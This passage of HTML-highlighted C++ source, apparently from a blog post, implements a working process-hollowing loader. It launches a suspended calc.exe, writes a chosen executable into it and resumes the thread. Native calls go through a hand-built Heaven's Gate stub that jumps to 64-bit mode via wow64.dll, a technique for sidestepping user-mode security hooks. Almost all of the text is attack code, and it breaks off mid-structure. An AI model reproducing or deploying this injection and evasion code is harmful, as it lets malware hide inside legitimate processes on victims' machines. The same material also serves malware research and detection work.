class="built_in">memcpy64</span>((ULONG64)&amp;ldrNode, (ULONG64)<span class="built_in">getPtr_Peb64</span>()-&gt;Ldr, <span class="built_in">sizeof</span>(ldrNode));/ / <span class="function">fetch ldr head node</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="params">(ULONG64 ptrCurr = ldrNode.InLoadOrderModuleList.Flink;; ptrCurr = currNode.InLoadOrderLinks.Flink)</span> </span>&#123; <span class="comment">// read the first ldr node (should be the current EXE module)</span></span><br><span class="line">        <span class="built_in">memcpy64</span>((ULONG64)&amp;currNode, ptrCurr, <span class="built_in">sizeof</span>(currNode));</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">wcsstr</span>(szDllName, <span class="built_in">get64b_WSTR</span>(currNode.BaseDllName.Buffer).<span class="built_in">c_str</span>()))</span><br><span class="line">            <span class="keyword">return</span> currNode.DllBase;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getPtr_Wow64SystemServiceEx</span><span class="params">(UINT64 &amp;value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ptr_wow64Mod = <span class="built_in">getPtr_Module64</span>(<span class="string">L&quot;wow64.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[v] current wow64.dll @ %llx\n&quot;</span>, ptr_wow64Mod);</span><br><span class="line">    <span class="type">char</span> exeBuf[<span class="number">4096</span>];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)&amp;exeBuf, ptr_wow64Mod, <span class="built_in">sizeof</span>(exeBuf));</span><br><span class="line">    <span class="keyword">auto</span> k = <span class="built_in">PIMAGE_NT_HEADERS64</span>(&amp;exeBuf[<span class="number">0</span>] + <span class="built_in">PIMAGE_DOS_HEADER</span>(exeBuf)-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">auto</span> rvaExportTable = k-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)&amp;exeBuf, ptr_wow64Mod + rvaExportTable, <span class="built_in">sizeof</span>(exeBuf));</span><br><span class="line">    <span class="keyword">auto</span> numOfNames = <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;NumberOfNames;</span><br><span class="line">    <span class="keyword">auto</span> arrOfNames = <span class="keyword">new</span> UINT32[numOfNames + <span class="number">1</span>], arrOfFuncs = <span class="keyword">new</span> UINT32[numOfNames + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">auto</span> addrOfNameOrds = <span class="keyword">new</span> UINT16[numOfNames + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)arrOfNames, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfNames, <span class="built_in">sizeof</span>(UINT32) * numOfNames);</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)addrOfNameOrds, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfNameOrdinals, <span class="built_in">sizeof</span>(UINT16) * numOfNames);</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)arrOfFuncs, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfFunctions, <span class="built_in">sizeof</span>(UINT32) * numOfNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; numOfNames; i++) &#123;</span><br><span class="line">        <span class="keyword">auto</span> currApiName = <span class="built_in">get64b_CSTR</span>(ptr_wow64Mod + arrOfNames[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[v] found export API -- %s\n&quot;</span>, currApiName.<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="string">&quot;Wow64SystemServiceEx&quot;</span>, currApiName.<span class="built_in">c_str</span>()))</span><br><span class="line">            value = ptr_wow64Mod + arrOfFuncs[addrOfNameOrds[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">getBytecodeOfNtAPI</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ntAPItoLookup)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> BYTE* dumpImage = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (dumpImage == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        FILE* fileptr; BYTE* buffer; LONGLONG filelen; <span class="comment">// read whole PE static binary.</span></span><br><span class="line">        fileptr = <span class="built_in">fopen</span>(<span class="string">&quot;C:/Windows/SysWoW64/ntdll.dll&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);</span><br><span class="line">        filelen = <span class="built_in">ftell</span>(fileptr);</span><br><span class="line">        <span class="built_in">rewind</span>(fileptr);</span><br><span class="line">        buffer = (BYTE*)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">        <span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr);</span><br><span class="line">        PIMAGE_NT_HEADERS ntHdr = (IMAGE_NT_HEADERS*)(buffer + ((IMAGE_DOS_HEADER*)buffer)-&gt;e_lfanew); <span class="comment">// dump static PE binary into image</span></span><br><span class="line">        dumpImage = (BYTE*)<span class="built_in">malloc</span>(ntHdr-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line">        <span class="built_in">memcpy</span>(dumpImage, buffer, ntHdr-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntHdr-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> curr = <span class="built_in">PIMAGE_SECTION_HEADER</span>(<span class="built_in">size_t</span>(ntHdr) + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS))[i];</span><br><span class="line">            <span class="built_in">memcpy</span>(dumpImage + curr.VirtualAddress, buffer + curr.PointerToRawData, curr.SizeOfRawData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(buffer);</span><br><span class="line">        <span class="built_in">fclose</span>(fileptr);</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHdr = (IMAGE_NT_HEADERS*)(dumpImage + ((IMAGE_DOS_HEADER*)dumpImage)-&gt;e_lfanew); <span class="comment">// EAT parse.</span></span><br><span class="line">    <span class="keyword">auto</span> a = ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)dumpImage + a.VirtualAddress);</span><br><span class="line">    <span class="type">uint32_t</span>* addrOfNames = (<span class="type">uint32_t</span>*)((<span class="type">size_t</span>)dumpImage + ied-&gt;AddressOfNames);</span><br><span class="line">    <span class="type">uint16_t</span>* addrOfNameOrds = (<span class="type">uint16_t</span>*)((<span class="type">size_t</span>)dumpImage + ied-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="type">uint32_t</span>* AddrOfFuncAddrs = (<span class="type">uint32_t</span>*)((<span class="type">size_t</span>)dumpImage + ied-&gt;AddressOfFunctions);</span><br><span class="line">    <span class="keyword">if</span> (ied-&gt;NumberOfNames == <span class="number">0</span>) <span class="keyword">return</span> (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; ied-&gt;NumberOfNames; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">stricmp</span>((<span class="type">char</span>*)((<span class="type">size_t</span>)dumpImage + addrOfNames[i]), ntAPItoLookup))</span><br><span class="line">            <span class="keyword">return</span> ((<span class="type">size_t</span>)dumpImage + AddrOfFuncAddrs[addrOfNameOrds[i]]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">NtAPI</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szNtApiToCall, ...)</span> </span>&#123;</span><br><span class="line">    PCHAR jit_stub;</span><br><span class="line">    PCHAR apiAddr = <span class="built_in">PCHAR</span>(<span class="built_in">getBytecodeOfNtAPI</span>(szNtApiToCall));</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title">ptrTranslator</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!ptrTranslator) <span class="built_in">getPtr_Wow64SystemServiceEx</span>(ptrTranslator);</span><br><span class="line">    <span class="type">static</span> <span class="type">uint8_t</span> stub_template[] = &#123;</span><br><span class="line">        <span class="comment">/* +00 - mov eax, 00000000      */</span> <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* +05 - mov edx, ds:[esp+0x4]  */</span> <span class="number">0x8b</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* +09 - mov    ecx,eax         */</span> <span class="number">0x89</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="comment">/* +0B - enter 64 bit mode      */</span> <span class="number">0x6A</span>, <span class="number">0x33</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="comment">/* +17 - xchg r14, rsp */</span>        <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xE6</span>,</span><br><span class="line">        <span class="comment">/* +1A - call qword ptr [DEADBEEF] */</span> <span class="number">0xFF</span>, <span class="number">0x14</span>, <span class="number">0x25</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">        <span class="comment">/* +21 - xchg r14, rsp */</span> <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xE6</span>,</span><br><span class="line">        <span class="comment">/* +24 - exit 64 bit mode  */</span> <span class="number">0xE8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xC7</span>,<span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">4</span>, <span class="number">0x23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x83</span>, <span class="number">4</span>, <span class="number">0x24</span>, <span class="number">0xD</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xc3</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    jit_stub = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(stub_template), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(jit_stub, stub_template, <span class="built_in">sizeof</span>(stub_template));</span><br><span class="line">    va_list    args;</span><br><span class="line">    <span class="built_in">va_start</span>(args, szNtApiToCall);</span><br><span class="line">    *((<span class="type">uint32_t</span>*)&amp;jit_stub[<span class="number">0x01</span>]) = *(<span class="type">uint32_t</span>*)&amp;apiAddr[<span class="number">1</span>];</span><br><span class="line">    *((<span class="type">uint32_t</span>*)&amp;jit_stub[<span class="number">0x1d</span>]) = (<span class="type">size_t</span>)&amp;ptrTranslator;</span><br><span class="line">    <span class="keyword">auto</span> ret = ((<span class="built_in">NTSTATUS</span>(__cdecl*)(...))jit_stub)(args);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RunPortableExecutable</span><span class="params">(<span class="type">void</span>* Image)</span> </span>&#123;</span><br><span class="line">    IMAGE_DOS_HEADER* DOSHeader; <span class="comment">// For Nt DOS Header symbols</span></span><br><span class="line">    IMAGE_NT_HEADERS* NtHeader; <span class="comment">// For Nt PE Header objects &amp; symbols</span></span><br><span class="line">    IMAGE_SECTION_HEADER* SectionHeader;</span><br><span class="line">    PROCESS_INFORMATION PI;</span><br><span class="line">    STARTUPINFOA SI;</span><br><span class="line">    CONTEXT* CTX;</span><br><span class="line">    DWORD* ImageBase; <span class="comment">//Base address of the image</span></span><br><span class="line">    <span class="type">void</span>* pImageBase; <span class="comment">// Pointer to the image base</span></span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">char</span> CurrentFilePath[<span class="number">1024</span>] = <span class="string">&quot;C:\\Windows\\SysWOW64\\calc.exe&quot;</span>;</span><br><span class="line">    DOSHeader = <span class="built_in">PIMAGE_DOS_HEADER</span>(Image); <span class="comment">// Initialize Variable</span></span><br><span class="line">    NtHeader = <span class="built_in">PIMAGE_NT_HEADERS</span>(<span class="built_in">DWORD</span>(Image) + DOSHeader-&gt;e_lfanew); <span class="comment">// Initialize</span></span><br><span class="line">    <span class="keyword">if</span> (NtHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123;<span class="comment">// Check if image is a PE File.</span></span><br><span class="line">        <span class="built_in">ZeroMemory</span>(&amp;PI, <span class="built_in">sizeof</span>(PI)); <span class="comment">// Null the memory</span></span><br><span class="line">        <span class="built_in">ZeroMemory</span>(&amp;SI, <span class="built_in">sizeof</span>(SI)); <span class="comment">// Null the memory</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">CreateProcessA</span>(CurrentFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI)) &#123;</span><br><span class="line">            CTX = <span class="built_in">LPCONTEXT</span>(<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));<span class="comment">// Allocate memory for the context.</span></span><br><span class="line">            CTX-&gt;ContextFlags = CONTEXT_FULL; <span class="comment">// Context is allocated</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">GetThreadContext</span>(PI.hThread, <span class="built_in">LPCONTEXT</span>(CTX))) &#123;<span class="comment">//if context is in thread</span></span><br><span class="line">                pImageBase = <span class="built_in">VirtualAllocEx</span>(PI.hProcess, <span class="built_in">LPVOID</span>(NtHeader-&gt;OptionalHeader.ImageBase), NtHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">                <span class="keyword">if</span> (pImageBase == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">NtAPI</span>(<span class="string">&quot;ZwTerminateProcess&quot;</span>, PI.hProcess, <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtWriteVirtualMemory&quot;</span>, PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>); <span class="comment">// Write the image to the process</span></span><br><span class="line">                <span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; NtHeader-&gt;FileHeader.NumberOfSections; count++) &#123;</span><br><span class="line">                    SectionHeader = <span class="built_in">PIMAGE_SECTION_HEADER</span>(<span class="built_in">DWORD</span>(Image) + DOSHeader-&gt;e_lfanew + <span class="number">248</span> + (count * <span class="number">40</span>));</span><br><span class="line">                    <span class="built_in">NtAPI</span>(<span class="string">&quot;NtWriteVirtualMemory&quot;</span>, PI.hProcess, <span class="built_in">LPVOID</span>(<span class="built_in">DWORD</span>(pImageBase) + SectionHeader-&gt;VirtualAddress), <span class="built_in">LPVOID</span>(<span class="built_in">DWORD</span>(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtWriteVirtualMemory&quot;</span>, PI.hProcess, <span class="built_in">LPVOID</span>(CTX-&gt;Ebx + <span class="number">8</span>), <span class="built_in">PVOID</span>(&amp;NtHeader-&gt;OptionalHeader.ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">                CTX-&gt;Eax = <span class="built_in">DWORD</span>(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint; <span class="comment">// Move address of entry point to the eax register</span></span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtSetContextThread&quot;</span>, PI.hThread, CTX); <span class="comment">// Set the context</span></span><br><span class="line">                DWORD useless;</span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtResumeThread&quot;</span>, PI.hThread, &amp;useless); <span class="comment">//´Start the process/call main()</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Operation was successful.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="function">BYTE* <span class="title">MapFileToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span> filename[])</span> </span>&#123;</span><br><span class="line">    FILE *fileptr;</span><br><span class="line">    BYTE *buffer;</span><br><span class="line">    fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>);  <span class="comment">// Open the file in binary mode</span></span><br><span class="line">    <span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);          <span class="comment">// Jump to the end of the file</span></span><br><span class="line">    <span class="type">long</span> filelen = <span class="built_in">ftell</span>(fileptr);             <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">    <span class="built_in">rewind</span>(fileptr);                      <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">    buffer = (BYTE *)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">    <span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr); <span class="comment">// Read in the entire file</span></span><br><span class="line">    <span class="built_in">fclose</span>(fileptr); <span class="comment">// Close the file</span></span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">RunPortableExecutable</span>(<span class="built_in">MapFileToMemory</span>(<span class="string">&quot;C:/toolchain/picaball.exe&quot;</span>)); <span class="comment">// hey, RunPE again: github.com/Zer0Mem0ry/RunPE</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//wow64ext.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> STATUS_SUCCESS</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY_T</span>&#123;</span><br><span class="line">    T Flink;</span><br><span class="line">    T Blink;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_T</span>&#123;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        <span class="keyword">struct</span>&#123;</span><br><span class="line">            WORD Length;</span><br><span class="line">            WORD MaximumLength;</span><br><span class="line">        &#125;;</span><br><span class="line">        T dummy;</span><br><span class="line">    &#125;;</span><br><span class="line">    T Buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_NT_TIB_T</span>&#123;</span><br><span class="line">    T ExceptionList;</span><br><span class="line">    T StackBase;</span><br><span class="line">    T StackLimit;</span><br><span class="line">    T SubSystemTib;</span><br><span class="line">    T FiberData;</span><br><span class="line">    T ArbitraryUserPointer;</span><br><span class="line">    T Self;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span>&#123;</span><br><span class="line">    T UniqueProcess;</span><br><span class="line">    T UniqueThread;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_TEB_T_</span>&#123;</span><br><span class="line">    _NT_TIB_T&lt;T&gt; NtTib;</span><br><span class="line">    T EnvironmentPointer;</span><br><span class="line">    _CLIENT_ID&lt;T&gt; ClientId;</span><br><span class="line">    T ActiveRpcHandle;</span><br><span class="line">    T ThreadLocalStoragePointer;</span><br><span class="line">    T ProcessEnvironmentBlock;</span><br><span class="line">    DWORD LastErrorValue;</span><br><span class="line">    DWORD CountOfOwnedCriticalSections;</span><br><span class="line">    T CsrClientThread;</span><br><span class="line">    T Win32ThreadInfo;</span><br><span class="line">    DWORD User32Reserved[<span class="number">26</span>];</span><br><span class="line">    <span class="comment">//rest of the structure is not defined for now, as it is not needed</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY_T</span>&#123;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; InLoadOrderLinks;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; InMemoryOrderLinks;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; InInitializationOrderLinks;</span><br><span class="line">    T DllBase;</span><br><span class="line">    T EntryPoint;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        DWORD SizeOfImage;</span><br><span class="line">        T dummy01;</span><br><span class="line">    &#125;;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; FullDllName;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; BaseDllName;</span><br><span class="line">    DWORD Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        _LIST_ENTRY_T&lt;T&gt; HashLinks;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            T SectionPointer;</span><br><span class="line">            T CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        T LoadedImports;</span><br><span class="line">        DWORD TimeDateStamp;</span><br><span class="line">    &#125;;</span><br><span class="line">    T EntryPointActivationContext;</span><br><span class="line">    T PatchInformation;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; ForwarderLinks;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; ServiceTagLinks;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; StaticLinks;</span><br><span class="line">    T ContextInformation;</span><br><span class="line">    T OriginalBase;</span><br><span class="line">    _LARGE_INTEGER LoadTime;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA_T</span>&#123;</span><br><span class="line">    DWORD Length;</span><br><span class="line">    DWORD Initialized;</span><br><span class="line">    T SsHandle;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; InLoadOrderModuleList;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; InMemoryOrderModuleList;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; InInitializationOrderModuleList;</span><br><span class="line">    T EntryInProgress;</span><br><span class="line">    DWORD ShutdownInProgress;</span><br><span class="line">    T ShutdownThreadId;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">NGF</span>, <span class="type">int</span> A&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_T</span>&#123;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        <span class="keyword">struct</span>&#123;</span><br><span class="line">            BYTE InheritedAddressSpace;</span><br><span class="line">            BYTE ReadImageFileExecOptions;</span><br><span class="line">            BYTE BeingDebugged;</span><br><span class="line">            BYTE BitField;</span><br><span class="line">        &#125;;</span><br><span class="line">        T dummy01;</span><br><span class="line">    &#125;;</span><br><span class="line">    T Mutant;</span><br><span class="line">    T ImageBaseAddress;</span><br><span class="line">    T Ldr;</span><br><span class="line">    T ProcessParameters;</span><br><span class="line">    T SubSystemData;</span><br><span class="line">    T ProcessHeap;</span><br><span class="line">    T FastPebLock;</span><br><span class="line">    T AtlThunkSListPtr;</span><br><span class="line">    T IFEOKey;</span><br><span class="line">    T CrossProcessFlags;</span><br><span class="line">    T UserSharedInfoPtr;</span><br><span class="line">    DWORD SystemReserved;</span><br><span class="line">    DWORD AtlThunkSListPtr32;</span><br><span class="line">    T ApiSetMap;</span><br><span class="line">    T TlsExpansionCounter;</span><br><span class="line">    T TlsBitmap;</span><br><span class="line">    DWORD TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    T ReadOnlySharedMemoryBase;</span><br><span class="line">    T HotpatchInformation;</span><br><span class="line">    T ReadOnlyStaticServerData;</span><br><span class="line">    T AnsiCodePageData;</span><br><span class="line">    T OemCodePageData;</span><br><span class="line">    T UnicodeCaseTableData;</span><br><span class="line">    DWORD NumberOfProcessors;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        DWORD NtGlobalFlag;</span><br><span class="line">        NGF dummy02;</span><br><span class="line">    &#125;;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    T HeapSegmentReserve;</span><br><span class="line">    T HeapSegmentCommit;</span><br><span class="line">    T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    DWORD NumberOfHeaps;</span><br><span class="line">    DWORD MaximumNumberOfHeaps;</span><br><span class="line">    T ProcessHeaps;</span><br><span class="line">    T GdiSharedHandleTable;</span><br><span class="line">    T ProcessStarterHelper;</span><br><span class="line">    T GdiDCAttributeList;</span><br><span class="line">    T LoaderLock;</span><br><span class="line">    DWORD OSMajorVersion;</span><br><span class="line">    DWORD OSMinorVersion;</span><br><span class="line">    WORD OSBuildNumber;</span><br><span class="line">    WORD OSCSDVersion;</span><br><span class="line">    DWORD OSPlatformId;</span><br><span class="line">    DWORD ImageSubsystem;</span><br><span class="line">    DWORD ImageSubsystemMajorVersion;</span><br><span class="line">    T ImageSubsystemMinorVersion;</span><br><span class="line">    T ActiveProcessAffinityMask;</span><br><span class="line">    T GdiHandleBuffer[A];</span><br><span class="line">    T PostProcessInitRoutine; </span><br><span class="line">    T TlsExpansionBitmap; </span><br><span class="line">    DWORD TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    T SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    T pShimData;</span><br><span class="line">    T AppCompatInfo;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; CSDVersion;</span><br><span class="line">    T ActivationContextData;</span><br><span class="line">    T ProcessAssemblyStorageMap;</span><br><span class="line">    T SystemDefaultActivationContextData;</span><br><span class="line">    T SystemAssemblyStorageMap;</span><br><span class="line">    T MinimumStackCommit;</span><br><span class="line">    T FlsCallback;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; FlsListHead;</span><br><span class="line">    T FlsBitmap;</span><br><span class="line">    DWORD FlsBitmapBits[<span class="number">4</span>];</span><br><span class="line">    T FlsHighIndex;</span><br><span class="line">    T WerRegistrationData;</span><br><span class="line">    T 